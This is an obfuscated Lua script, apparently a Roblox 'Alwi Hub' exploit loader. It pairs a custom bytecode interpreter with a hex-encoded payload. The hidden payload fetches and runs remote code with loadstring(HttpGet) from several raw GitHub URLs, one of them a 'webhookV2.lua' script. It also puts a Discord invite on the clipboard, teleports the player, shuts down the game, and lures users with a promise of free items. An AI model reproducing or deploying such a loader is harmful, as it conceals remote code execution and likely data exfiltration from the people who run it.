local v0 = tonumber;
local v1 = string.byte;
local v2 = string.char;
local v3 = string.sub;
local v4 = string.gsub;
local v5 = string.rep;
local v6 = table.concat;
local v7 = table.insert;
local v8 = math.ldexp;
local v9 = getfenv or function()
	return _ENV;
end;
local v10 = setmetatable;
local v11 = pcall;
local v12 = select;
local v13 = unpack or table.unpack;
local v14 = tonumber;
local function v15(v16, v17, ...)
	local v18 = 1;
	local v19;
	v16 = v4(v3(v16, 5), "..", function(v30)
		if (v1(v30, 2) == 81) then
			local v82 = 0;
			while true do
				if (v82 == 0) then
					v19 = v0(v3(v30, 1, 1));
					return "";
				end
			end
		else
			local v83 = v2(v0(v30, 16));
			if v19 then
				local v90 = v5(v83, v19);
				v19 = nil;
				return v90;
			else
				return v83;
			end
		end
	end);
	local function v20(v31, v32, v33)
		if v33 then
			local v84 = (v31 / ((5 - 3) ^ (v32 - (1 + 0)))) % ((5 - 3) ^ (((v33 - (1 - 0)) - (v32 - (2 - 1))) + (620 - (555 + 64))));
			return v84 - (v84 % (1 + 0));
		else
			local v85 = 931 - (857 + 74);
			local v86;
			while true do
				if (v85 == 0) then
					v86 = (570 - (367 + 201)) ^ (v32 - (928 - (214 + 159 + 554)));
					return (((v31 % (v86 + v86)) >= v86) and ((2 - 1) + 0)) or (117 - (32 + 85));
				end
			end
		end
	end
	local function v21()
		local v34 = 0 - 0;
		local v35;
		while true do
			if (v34 == 1) then
				return v35;
			end
			if (v34 == (0 - 0)) then
				v35 = v1(v16, v18, v18);
				v18 = v18 + (351 - (87 + 263));
				v34 = 181 - (67 + 113);
			end
		end
	end
	local function v22()
		local v36, v37 = v1(v16, v18, v18 + 2 + 0);
		v18 = v18 + (4 - 2);
		return (v37 * (189 + 67)) + v36;
	end
	local function v23()
		local v38, v39, v40, v41 = v1(v16, v18, v18 + (11 - 8));
		v18 = v18 + (6 - 2);
		return (v41 * (12211951 + 4565265)) + (v40 * (66533 - (915 + 48 + 34))) + (v39 * (1208 - ((1054 - 252) + 150))) + v38;
	end
	local function v24()
		local v42 = v23();
		local v43 = v23();
		local v44 = 1188 - ((1841 - (201 + 571)) + 118);
		local v45 = (v20(v43, 1139 - (116 + 1022), (187 - 142) - 25) * ((3 - 1) ^ (6 + 26))) + v42;
		local v46 = v20(v43, 37 - 16, 31 + 0);
		local v47 = ((v20(v43, 823 - (217 + 151 + 423)) == ((10 - 7) - 2)) and -(19 - ((35 - 25) + 8))) or ((862 - (814 + 45)) - 2);
		if (v46 == (442 - ((1024 - 608) + 2 + 24))) then
			if (v45 == (0 - 0)) then
				return v47 * (0 + 0);
			else
				v46 = 1 - 0;
				v44 = 0;
			end
		elseif (v46 == 2047) then
			return ((v45 == (438 - (145 + 293))) and (v47 * ((431 - (44 + 386)) / (1486 - (998 + 488))))) or (v47 * NaN);
		end
		return v8(v47, v46 - (325 + 247 + 451)) * (v44 + (v45 / (2 ^ (43 + 9))));
	end
	local function v25(v48)
		local v49;
		if not v48 then
			v48 = v23();
			if (v48 == (885 - (261 + 624))) then
				return "";
			end
		end
		v49 = v3(v16, v18, (v18 + v48) - 1);
		v18 = v18 + v48;
		local v50 = {};
		for v65 = 1 - 0, #v49 do
			v50[v65] = v2(v1(v3(v49, v65, v65)));
		end
		return v6(v50);
	end
	local v26 = v23;
	local function v27(...)
		return {...}, v12("#", ...);
	end
	local function v28()
		local v51 = (function()
			return 0 + 0;
		end)();
		local v52 = (function()
			return;
		end)();
		local v53 = (function()
			return;
		end)();
		local v54 = (function()
			return;
		end)();
		local v55 = (function()
			return;
		end)();
		local v56 = (function()
			return;
		end)();
		local v57 = (function()
			return;
		end)();
		local v58 = (function()
			return;
		end)();
		while true do
			local v67 = (function()
				return 1637 - (195 + 1442);
			end)();
			while true do
				if (v67 == (1581 - (1535 + 46))) then
					if (v51 == (1 + 0)) then
						v56 = (function()
							return {v53,v54,nil,v55};
						end)();
						v57 = (function()
							return v23();
						end)();
						v58 = (function()
							return {};
						end)();
						for v97 = #"}", v57 do
							local v98 = (function()
								return 560 - (306 + 254);
							end)();
							local v99 = (function()
								return;
							end)();
							local v100 = (function()
								return;
							end)();
							local v101 = (function()
								return;
							end)();
							while true do
								if ((2 - 1) == v98) then
									v101 = (function()
										return nil;
									end)();
									while true do
										if (v99 ~= (1 + 0)) then
										else
											if (v100 == #"}") then
												v101 = (function()
													return v21() ~= (0 + 0);
												end)();
											elseif (v100 == (398 - (115 + 281))) then
												v101 = (function()
													return v24();
												end)();
											elseif (v100 == #"19(") then
												v101 = (function()
													return v25();
												end)();
											end
											v58[v97] = (function()
												return v101;
											end)();
											break;
										end
										if (0 == v99) then
											local v280 = (function()
												return 0 - 0;
											end)();
											while true do
												if (v280 == (1 + 0)) then
													v99 = (function()
														return 2 - 1;
													end)();
													break;
												end
												if ((0 - 0) == v280) then
													v100 = (function()
														return v21();
													end)();
													v101 = (function()
														return nil;
													end)();
													v280 = (function()
														return 1;
													end)();
												end
											end
										end
									end
									break;
								end
								if (0 ~= v98) then
								else
									v99 = (function()
										return 0 + 0;
									end)();
									v100 = (function()
										return nil;
									end)();
									v98 = (function()
										return 1;
									end)();
								end
							end
						end
						v51 = (function()
							return 869 - (550 + 317);
						end)();
					end
					if (v51 == (4 - 2)) then
						v56[#"-19"] = (function()
							return v21();
						end)();
						for v102 = #",", v23() do
							local v103 = (function()
								return v21();
							end)();
							if (v20(v103, #"\\", #"{") ~= 0) then
							else
								local v105 = (function()
									return 603 - (268 + 335);
								end)();
								local v106 = (function()
									return;
								end)();
								local v107 = (function()
									return;
								end)();
								local v108 = (function()
									return;
								end)();
								local v109 = (function()
									return;
								end)();
								while true do
									if ((0 - 0) ~= v105) then
									else
										local v175 = (function()
											return 0;
										end)();
										while true do
											if (v175 ~= (290 - (60 + 230))) then
											else
												v106 = (function()
													return 0 - 0;
												end)();
												v107 = (function()
													return nil;
												end)();
												v175 = (function()
													return 1 + 0;
												end)();
											end
											if (v175 == (2 - 1)) then
												v105 = (function()
													return 812 - (569 + 242);
												end)();
												break;
											end
										end
									end
									if (v105 == (287 - (134 + 151))) then
										while true do
											if (v106 == 0) then
												local v286 = (function()
													return 0 - 0;
												end)();
												local v287 = (function()
													return;
												end)();
												while true do
													if (v286 == (1665 - (970 + 695))) then
														v287 = (function()
															return 0;
														end)();
														while true do
															if (v287 == 1) then
																v106 = (function()
																	return #">";
																end)();
																break;
															end
															if (v287 == 0) then
																v107 = (function()
																	return v20(v103, 2, #"19(");
																end)();
																v108 = (function()
																	return v20(v103, #"?id=", 6);
																end)();
																v287 = (function()
																	return 1 - 0;
																end)();
															end
														end
														break;
													end
												end
											end
											if (v106 == #"nil") then
												if (v20(v108, #"19(", #"xxx") == #"!") then
													v109[#"0313"] = (function()
														return v58[v109[#"0313"]];
													end)();
												end
												v53[v102] = (function()
													return v109;
												end)();
												break;
											end
											if (v106 ~= (1992 - (582 + 1408))) then
											else
												local v289 = (function()
													return 0 - 0;
												end)();
												local v290 = (function()
													return;
												end)();
												while true do
													if ((1024 - (706 + 318)) == v289) then
														v290 = (function()
															return 1251 - (721 + 530);
														end)();
														while true do
															if (v290 == (1272 - (945 + 326))) then
																v106 = (function()
																	return #"91(";
																end)();
																break;
															end
															if (v290 == (0 - 0)) then
																if (v20(v108, #":", #" ") ~= #"|") then
																else
																	v109[2] = (function()
																		return v58[v109[2 + 0]];
																	end)();
																end
																if (v20(v108, 7 - 5, 2) == #",") then
																	v109[#"91("] = (function()
																		return v58[v109[#"-19"]];
																	end)();
																end
																v290 = (function()
																	return 1;
																end)();
															end
														end
														break;
													end
												end
											end
											if (v106 == #"<") then
												local v291 = (function()
													return 700 - (271 + 429);
												end)();
												while true do
													if (v291 == 1) then
														v106 = (function()
															return 2 + 0;
														end)();
														break;
													end
													if (v291 ~= (1824 - (1195 + 629))) then
													else
														v109 = (function()
															return {v22(),v22(),nil,nil};
														end)();
														if (v107 == (241 - (187 + 54))) then
															local v306 = (function()
																return 780 - (162 + 618);
															end)();
															while true do
																if (v306 ~= (0 + 0)) then
																else
																	v109[#"nil"] = (function()
																		return v22();
																	end)();
																	v109[#"asd1"] = (function()
																		return v22();
																	end)();
																	break;
																end
															end
														elseif (v107 == #"<") then
															v109[#"-19"] = (function()
																return v23();
															end)();
														elseif (v107 == (2 + 0)) then
															v109[#"xxx"] = (function()
																return v23() - ((1173 - (418 + 753)) ^ 16);
															end)();
														elseif (v107 ~= #"gha") then
														else
															local v313 = (function()
																return 0 - 0;
															end)();
															local v314 = (function()
																return;
															end)();
															while true do
																if (v313 ~= 0) then
																else
																	v314 = (function()
																		return 0 - 0;
																	end)();
																	while true do
																		if (v314 ~= (0 + 0)) then
																		else
																			v109[#"nil"] = (function()
																				return v23() - ((1638 - (1373 + 263)) ^ (5 + 11));
																			end)();
																			v109[#"xnxx"] = (function()
																				return v22();
																			end)();
																			break;
																		end
																	end
																	break;
																end
															end
														end
														v291 = (function()
															return 1;
														end)();
													end
												end
											end
										end
										break;
									end
									if (v105 == 1) then
										v108 = (function()
											return nil;
										end)();
										v109 = (function()
											return nil;
										end)();
										v105 = (function()
											return 2;
										end)();
									end
								end
							end
						end
						for v104 = #":", v23() do
							v54, v104, v28 = (function()
								return v52(v54, v104, v28);
							end)();
						end
						return v56;
					end
					v67 = (function()
						return 1001 - (451 + 549);
					end)();
				end
				if (v67 ~= (1 + 0)) then
				else
					if (0 ~= v51) then
					else
						local v96 = (function()
							return 0 + 0;
						end)();
						while true do
							if (v96 ~= 2) then
							else
								v51 = (function()
									return 1;
								end)();
								break;
							end
							if ((1769 - (1749 + 20)) == v96) then
								v52 = (function()
									return function(v162, v163, v164)
										local v165 = (function()
											return 0 - 0;
										end)();
										local v166 = (function()
											return;
										end)();
										while true do
											if (v165 ~= (0 - 0)) then
											else
												v166 = (function()
													return 1384 - (746 + 638);
												end)();
												while true do
													if (v166 == (0 + 0)) then
														v162[v163 - #"["] = (function()
															return v164();
														end)();
														return v162, v163, v164;
													end
												end
												break;
											end
										end
									end;
								end)();
								v53 = (function()
									return {};
								end)();
								v96 = (function()
									return 1;
								end)();
							end
							if (v96 == (1 - 0)) then
								v54 = (function()
									return {};
								end)();
								v55 = (function()
									return {};
								end)();
								v96 = (function()
									return 4 - 2;
								end)();
							end
						end
					end
					break;
				end
			end
		end
	end
	local function v29(v59, v60, v61)
		local v62 = v59[2 - 1];
		local v63 = v59[1902 - (106 + 1794)];
		local v64 = v59[3];
		return function(...)
			local v68 = v62;
			local v69 = v63;
			local v70 = v64;
			local v71 = v27;
			local v72 = 1 + 0;
			local v73 = -1;
			local v74 = {};
			local v75 = {...};
			local v76 = v12("#", ...) - (2 - 1);
			local v77 = {};
			local v78 = {};
			for v87 = 0 - 0, v76 do
				if (v87 >= v70) then
					v74[v87 - v70] = v75[v87 + 1];
				else
					v78[v87] = v75[v87 + (338 - (10 + 327))];
				end
			end
			local v79 = (v76 - v70) + (115 - (4 + 110));
			local v80;
			local v81;
			while true do
				v80 = v68[v72];
				v81 = v80[585 - (57 + 367 + 160)];
				if ((v81 <= 12) or (876 >= 3075)) then
					if ((4514 > 3324) and (v81 <= (1432 - (41 + 1386)))) then
						if (v81 <= (105 - (17 + 86))) then
							if ((v81 <= 0) or (208 >= 4828)) then
								local v110;
								local v111;
								v111 = v80[2 + 0];
								v110 = v78[v80[6 - 3]];
								v78[v111 + (2 - (339 - (118 + 220)))] = v110;
								v78[v111] = v110[v80[170 - (122 + 44)]];
								v72 = v72 + (1 - 0);
								v80 = v68[v72];
								v111 = v80[2];
								v78[v111](v78[v111 + (3 - 2)]);
								v72 = v72 + 1 + 0;
								v80 = v68[v72];
								v78[v80[1 + 1]] = v61[v80[3]];
								v72 = v72 + (1 - (0 + 0));
								v80 = v68[v72];
								v111 = v80[67 - (30 + 35)];
								v110 = v78[v80[(452 - (108 + 341)) + 0]];
								v78[v111 + (1258 - (1043 + 214))] = v110;
								v78[v111] = v110[v80[4]];
								v72 = v72 + 1;
								v80 = v68[v72];
								v78[v80[7 - 5]] = v80[3];
								v72 = v72 + (1213 - (323 + 889));
								v80 = v68[v72];
								v111 = v80[2];
								v78[v111] = v78[v111](v13(v78, v111 + (2 - 1), v80[3]));
								v72 = v72 + (581 - (361 + 219));
								v80 = v68[v72];
								v111 = v80[2];
								v110 = v78[v80[323 - (24 + 29 + 267)]];
								v78[v111 + 1 + 0] = v110;
								v78[v111] = v110[v80[417 - (15 + 398)]];
								v72 = v72 + (983 - ((76 - 58) + 964));
								v80 = v68[v72];
								v111 = v80[(1500 - (711 + 782)) - 5];
								v78[v111](v78[v111 + 1 + (0 - 0)]);
								v72 = v72 + (470 - (270 + 199)) + 0;
								v80 = v68[v72];
								v72 = v80[(277 + 576) - (20 + 830)];
							elseif (v81 == (1 + 0)) then
								v78[v80[1821 - (580 + 1239)]] = v78[v80[3]];
							else
								local v178 = v80[2];
								v78[v178](v78[v178 + (127 - (116 + 10))]);
							end
						elseif ((v81 <= 3) or (1583 > 3567)) then
							for v167 = v80[(2 - 1) + 1], v80[741 - (542 + 196)] do
								v78[v167] = nil;
							end
						elseif (v81 > (8 - 4)) then
							v78[v80[1 + 1]] = v61[v80[3]];
						else
							local v181 = v80[2 + 0 + 0];
							v78[v181](v13(v78, v181 + 1, v80[2 + 1]));
						end
					elseif ((4352 > 2554) and (v81 <= (20 - 12))) then
						if (v81 <= (15 - 9)) then
							local v132 = v80[1553 - (1126 + 425)];
							local v133 = v78[v132];
							local v134 = v80[408 - (118 + 287)];
							for v169 = 3 - 2, v134 do
								v133[v169] = v78[v132 + v169];
							end
						elseif (v81 == 7) then
							v78[v80[1123 - (118 + 1003)]] = v29(v69[v80[3]], nil, v61);
						else
							local v183;
							local v184, v185;
							local v186;
							local v187;
							v78[v80[5 - 3]] = v61[v80[380 - (142 + 235)]];
							v72 = v72 + 1;
							v80 = v68[v72];
							v187 = v80[9 - 7];
							v186 = v78[v80[1 + 2]];
							v78[v187 + 1] = v186;
							v78[v187] = v186[v80[4]];
							v72 = v72 + ((36 + 942) - (553 + 424));
							v80 = v68[v72];
							v78[v80[3 - 1]] = v80[3 + 0];
							v72 = v72 + 1 + 0 + 0;
							v80 = v68[v72];
							v187 = v80[2 + 0];
							v184, v185 = v71(v78[v187](v13(v78, v187 + 1, v80[2 + 1])));
							v73 = (v185 + v187) - ((2 - 1) + 0);
							v183 = 0 - 0;
							for v281 = v187, v73 do
								v183 = v183 + (2 - 1);
								v78[v281] = v184[v183];
							end
							v72 = v72 + (2 - 1);
							v80 = v68[v72];
							v187 = v80[2];
							v78[v187] = v78[v187](v13(v78, v187 + 1, v73));
							v72 = v72 + 1;
							v80 = v68[v72];
							v187 = v80[2 + 0];
							v78[v187] = v78[v187]();
							v72 = v72 + 1 + 0;
							v80 = v68[v72];
							v78[v80[(1176 - (645 + 522)) - 7]] = v78[v80[756 - (239 + 514)]];
							v72 = v72 + 1 + 0;
							v80 = v68[v72];
							v78[v80[1331 - (797 + 532)]] = v78[v80[(1793 - (1010 + 780)) + 0]];
							v72 = v72 + 1 + 0;
							v80 = v68[v72];
							v78[v80[4 - (2 + 0)]] = v80[3];
							v72 = v72 + (1203 - (373 + 829));
							v80 = v68[v72];
							v78[v80[(3491 - 2758) - (476 + 255)]] = v80[1133 - (369 + 761)];
						end
					elseif ((v81 <= (6 + 4)) or (1313 == 794)) then
						if ((3174 > 2902) and ((v81 == ((43 - 28) - 6)) or (4406 < 4043))) then
							local v208 = 0 - 0;
							local v209;
							local v210;
							while true do
								if ((4120 <= 4260) and (v208 == (239 - (64 + 174)))) then
									v78[v209 + 1 + 0] = v210;
									v78[v209] = v210[v80[5 - 1]];
									break;
								end
								if (v208 == (336 - (144 + 192))) then
									v209 = v80[2];
									v210 = v78[v80[219 - (42 + 174)]];
									v208 = (1837 - (1045 + 791)) + 0;
								end
							end
						else
							local v211 = 0 + 0;
							local v212;
							local v213;
							local v214;
							local v215;
							while true do
								if (v211 == (0 + 0)) then
									v212 = v80[1506 - (363 + 1141)];
									v213, v214 = v71(v78[v212](v13(v78, v212 + (1581 - (1183 + 397)), v80[8 - (12 - 7)])));
									v211 = 1 + 0;
								end
								if (v211 == (1 + 0)) then
									v73 = (v214 + v212) - (1976 - (1913 + 62));
									v215 = 0 + 0;
									v211 = 5 - (4 - 1);
								end
								if ((v211 == (1935 - (565 + 1368))) or (1889 >= 3383)) then
									for v300 = v212, v73 do
										local v301 = 505 - (351 + 154);
										while true do
											if (((0 - 0) == v301) or (883 > 4778)) then
												v215 = v215 + (1662 - (1477 + 184));
												v78[v300] = v213[v215];
												break;
											end
										end
									end
									break;
								end
							end
						end
					elseif (v81 > (14 - (1577 - (1281 + 293)))) then
						local v216 = 0 + 0;
						local v217;
						while true do
							if (v216 == 0) then
								v217 = v80[858 - (564 + 292)];
								v78[v217] = v78[v217]();
								break;
							end
						end
					else
						v78[v80[2 - (266 - (28 + 238))]] = v80[8 - 5];
					end
				elseif (v81 <= (323 - (244 + 60))) then
					if ((v81 <= (12 + 3)) or (3620 >= 4891)) then
						if ((1892 <= 2734) and (v81 <= (489 - (41 + 435)))) then
							v78[v80[(2240 - 1237) - (938 + 63)]] = {};
						elseif ((4258 > 937) and (1923 < 2218) and (v81 > (11 + 3))) then
							local v220 = v80[(2686 - (1381 + 178)) - (936 + 178 + 11)];
							v78[v220] = v78[v220](v13(v78, v220 + 1 + 0, v73));
						else
							local v222;
							local v223;
							v223 = v80[1615 - (1262 + 303 + 48)];
							v222 = v78[v80[2 + 1]];
							v78[v223 + (1139 - (782 + 356))] = v222;
							v78[v223] = v222[v80[271 - (176 + 91)]];
							v72 = v72 + 1 + 0;
							v80 = v68[v72];
							v78[v80[4 - 2]] = v80[4 - 1];
							v72 = v72 + ((3767 - 2674) - (975 + 117));
							v80 = v68[v72];
							v223 = v80[(973 + 904) - (157 + 1718)];
							v78[v223] = v78[v223](v13(v78, v223 + 1 + 0, v80[10 - 7]));
							v72 = v72 + (3 - 2);
							v80 = v68[v72];
							v223 = v80[1020 - (697 + 321)];
							v222 = v78[v80[7 - 4]];
							v78[v223 + 1] = v222;
							v78[v223] = v222[v80[8 - 4]];
							v72 = v72 + 1;
							v80 = v68[v72];
							v78[v80[4 - 2]] = v80[2 + (471 - (381 + 89))];
							v72 = v72 + 1;
							v80 = v68[v72];
							v78[v80[2]] = v61[v80[5 - (2 + 0)]];
							v72 = v72 + 1;
							v80 = v68[v72];
							v78[v80[(4 + 1) - 3]] = v78[v80[1230 - (322 + 905)]][v80[615 - (602 + 9)]];
							v72 = v72 + (1190 - (449 + (1267 - 527)));
							v80 = v68[v72];
							v78[v80[(2030 - (1074 + 82)) - (826 + 46)]] = v78[v80[950 - (245 + 702)]][v80[12 - (17 - 9)]];
							v72 = v72 + 1 + 0;
							v80 = v68[v72];
							v223 = v80[1900 - (260 + 1638)];
							v78[v223](v13(v78, v223 + (441 - (382 + 58)), v80[9 - 6]));
							v72 = v72 + (1785 - (214 + 1570));
							v80 = v68[v72];
							v78[v80[2]] = v61[v80[3 + 0]];
							v72 = v72 + (1 - 0);
							v80 = v68[v72];
							v223 = v80[(1460 - (990 + 465)) - 3];
							v222 = v78[v80[1208 - (902 + 303)]];
							v78[v223 + (1 - 0)] = v222;
							v78[v223] = v222[v80[9 - 5]];
							v72 = v72 + 1 + 0;
							v80 = v68[v72];
							v78[v80[2]] = v80[1693 - (1121 + 569)];
							v72 = v72 + 1;
							v80 = v68[v72];
							v223 = v80[216 - (22 + 192)];
							v78[v223] = v78[v223](v13(v78, v223 + (684 - (483 + 200)), v80[3]));
							v72 = v72 + 1 + 0;
							v80 = v68[v72];
							v223 = v80[1465 - (1404 + 59)];
							v222 = v78[v80[8 - 5]];
							v78[v223 + ((1 + 0) - (0 + 0))] = v222;
							v78[v223] = v222[v80[769 - (468 + 297)]];
							v72 = v72 + (563 - (334 + (897 - 669)));
							v80 = v68[v72];
							v223 = v80[6 - 4];
							v78[v223](v78[v223 + 1]);
							v72 = v72 + 1;
							v80 = v68[v72];
							v78[v80[4 - 2]] = v80[5 - 2];
							v72 = v72 + 1 + 0;
							v80 = v68[v72];
							v72 = v80[239 - (141 + (1821 - (1668 + 58)))];
						end
					elseif ((v81 <= (17 + 0)) or (4869 < 906)) then
						if (v81 == (41 - 25)) then
							v78[v80[4 - 2]] = v78[v80[1 + 2]][v80[10 - 6]];
						else
							v78[v80[2 + 0]][v80[2 + 1]] = v80[4];
						end
					elseif (v81 == (25 - (633 - (512 + 114)))) then
						v72 = v80[2 + 1];
					else
						do
							return;
						end
					end
				elseif (v81 <= ((482 - 297) - (92 + 71))) then
					if (((2173 > 379) and (v81 <= (10 + 10))) or (1225 > 4228)) then
						local v136;
						local v137, v138;
						local v139;
						local v140;
						v78[v80[(3 - 1) - 0]] = v61[v80[768 - (574 + 191)]];
						v72 = v72 + 1 + (0 - 0);
						v80 = v68[v72];
						v140 = v80[4 - (1 + 1)];
						v139 = v78[v80[3]];
						v78[v140 + 1 + 0 + 0] = v139;
						v78[v140] = v139[v80[853 - (254 + 595)]];
						v72 = v72 + (127 - (55 + 71));
						v80 = v68[v72];
						v78[v80[2 - 0]] = v80[1793 - (573 + 1217)];
						v72 = v72 + (2 - 1);
						v80 = v68[v72];
						v140 = v80[1 + 1];
						v137, v138 = v71(v78[v140](v13(v78, v140 + (1 - 0), v80[942 - (714 + 225)])));
						v73 = (v138 + v140) - ((2 + 0) - (3 - 2));
						v136 = 0 - 0;
						for v172 = v140, v73 do
							v136 = v136 + 1 + 0;
							v78[v172] = v137[v136];
						end
						v72 = v72 + (1 - (1994 - (109 + 1885)));
						v80 = v68[v72];
						v140 = v80[1471 - (1269 + 200)];
						v78[v140] = v78[v140](v13(v78, v140 + (807 - (118 + 688)), v73));
						v72 = v72 + (49 - (25 + 23));
						v80 = v68[v72];
						v78[v80[1 + 1]]();
						v72 = v72 + 1;
						v80 = v68[v72];
						v78[v80[1888 - (927 + 959)]] = v61[v80[3]];
						v72 = v72 + (3 - 2);
						v80 = v68[v72];
						v78[v80[734 - (16 + 716)]] = v61[v80[3]];
						v72 = v72 + (1 - 0);
						v80 = v68[v72];
						v140 = v80[3 - 1];
						v139 = v78[v80[(915 - (98 + 717)) - (11 + 86)]];
						v78[v140 + (2 - (827 - (802 + 24)))] = v139;
						v78[v140] = v139[v80[4]];
						v72 = v72 + 1;
						v80 = v68[v72];
						v78[v80[2]] = v80[288 - (175 + 110)];
					elseif (v81 == (52 - 31)) then
						local v264 = v80[9 - 7];
						v78[v264] = v78[v264](v13(v78, v264 + (1797 - (503 + 1293)), v80[8 - 5]));
					else
						local v266 = v80[2 + 0];
						local v267 = v78[v266];
						for v284 = v266 + 1, v80[1064 - (810 + 251)] do
							v7(v267, v78[v284]);
						end
					end
				elseif (v81 <= 24) then
					if ((3328 > 2238) and (v81 > (16 + 7))) then
						v78[v80[(1 - 0) + 1]]();
					else
						v78[v80[2 + 0]][v80[536 - (43 + 490)]] = v78[v80[4]];
					end
				elseif ((3839 > 1405) and ((v81 == (758 - (711 + 22))) or (2591 == 3409))) then
					if (v78[v80[7 - 5]] == v80[863 - (240 + 619)]) then
						v72 = v72 + 1;
					else
						v72 = v80[3];
					end
				else
					v78[v80[1 + 1]][v80[4 - 1]] = v78[v80[1 + 3]];
					v72 = v72 + (1745 - (1344 + 400));
					v80 = v68[v72];
					v78[v80[(513 - 106) - (255 + 150)]] = {};
					v72 = v72 + 1 + 0;
					v80 = v68[v72];
					v78[v80[2]][v80[2 + 1]] = v80[4];
					v72 = v72 + (4 - 3);
					v80 = v68[v72];
					v78[v80[(1 + 5) - (4 + 0)]][v80[1742 - (404 + 1335)]] = v80[4];
					v72 = v72 + (407 - (183 + 223));
					v80 = v68[v72];
					v78[v80[(1 + 1) - 0]][v80[1 + 1 + 1]] = v80[(5 - 3) + 2];
				end
				v72 = v72 + 1;
			end
		end;
	end
	return v29(v28(), {}, v17)(...);
end
return v15("LOL!163Q0003043Q0067616D6503073Q00506C6163654964023Q000F2F2Q0142028Q00030A3Q006C6F6164737472696E6703073Q00482Q747047657403663Q00682Q7470733A2Q2F7261772E67697468756275736572636F6E74656E742E636F6D2F49736E6F74616C77692F55492D6C69626172792D416C77696875622F726566732F68656164732F6D61696E2F50726F6D70742532305549253230526F626C6F782E6C756103093Q0048656164732055702103643Q005468697320416C7769204875622053637269707420446F20796F752077616E7420746F2074656C65706F727420746F2074686520706C61636520666F722033382066722Q652F6974656D733F2054686520706C61636520616C736F206861732066756E2103043Q005465787403183Q004578656375746520416C7769204875622053637269707473030B3Q004C61796F75744F72646572026Q00F03F03073Q005072696D6172792Q0103083Q0043612Q6C6261636B03053Q00436C6F7365027Q00400100022Q00984451CC0742036D3Q00682Q7470733A2Q2F7261772E67697468756275736572636F6E74656E742E636F6D2F49736E6F74616C77692F46722Q652D4974656D732D526F626C6F782F726566732F68656164732F6D61696E2F546F2Q6D79253230506C61792532304C6F616465722532304755492E6C756103573Q00682Q7470733A2Q2F7261772E67697468756275736572636F6E74656E742E636F6D2F49736E6F74616C77692F526F626C6F782D5363726970742F726566732F68656164732F6D61696E2F776562682Q6F6B56322E6C756100433Q0012053Q00013Q0020105Q00020026193Q0025000100030004123Q0025000100120B3Q00044Q0003000100013Q0026193Q0006000100040004123Q00060001001205000200053Q001208000300013Q00202Q00030003000600122Q000500076Q000300056Q00023Q00024Q0002000100024Q000100026Q000200013Q00122Q000300083Q00122Q000400094Q000D000500024Q000D00063Q00040030110006000A000B0030110006000C000D0030110006000E000F00020700075Q00101A0006001000074Q00073Q000400302Q0007000A001100302Q0007000C001200302Q0007000E0013000207000800013Q0010170007001000082Q00060005000200012Q00040002000500010004123Q004200010004123Q000600010004123Q004200010012053Q00013Q0020105Q00020026193Q0042000100140004123Q0042000100120B3Q00044Q0003000100013Q0026193Q002B000100040004123Q002B000100120B000100043Q0026190001002E000100040004123Q002E0001001205000200053Q001214000300013Q00202Q00030003000600122Q000500156Q000300056Q00023Q00024Q00020001000100122Q000200053Q00122Q000300013Q00202Q00030003000600122Q000500164Q000A000300054Q000F00023Q00022Q00180002000100010004123Q004200010004123Q002E00010004123Q004200010004123Q002B00012Q00133Q00013Q00023Q00013Q0003053Q007063612Q6C00043Q0012053Q00013Q00020700016Q00023Q000200012Q00133Q00013Q00013Q000D3Q00028Q00026Q00F03F030C3Q00736574636C6970626F617264031D3Q00682Q7470733A2Q2F646973636F72642E2Q672F624D62425A383770535603043Q0067616D65030A3Q0047657453657276696365030F3Q0054656C65706F72745365727669636503083Q0054656C65706F7274022Q00984451CC074203073Q00506C6179657273030B3Q004C6F63616C506C61796572030A3Q0047756953657276696365030A3Q00436C656172452Q726F72001C3Q00120B3Q00013Q0026193Q0007000100020004123Q00070001001205000100033Q00120B000200044Q00020001000200010004123Q001B00010026193Q0001000100010004123Q00010001001205000100053Q00200E00010001000600122Q000300076Q00010003000200202Q00010001000800122Q000300093Q00122Q000400053Q00202Q00040004000A00202Q00040004000B4Q00010004000100122Q000100053Q00202Q00010001000600122Q0003000C6Q00010003000200202Q00010001000D4Q00010002000100124Q00023Q00044Q000100012Q00133Q00017Q00063Q00028Q0003043Q0067616D6503083Q0053687574646F776E030A3Q0047657453657276696365030A3Q0047756953657276696365030A3Q00436C656172452Q726F7200153Q00120B3Q00014Q0003000100013Q0026193Q0002000100010004123Q0002000100120B000100013Q00261900010005000100010004123Q00050001001205000200023Q00202Q0002000200034Q00020002000100122Q000200023Q00202Q00020002000400122Q000400056Q00020004000200202Q0002000200064Q00020002000100044Q001400010004123Q000500010004123Q001400010004123Q000200012Q00133Q00017Q00", v9(), ...);
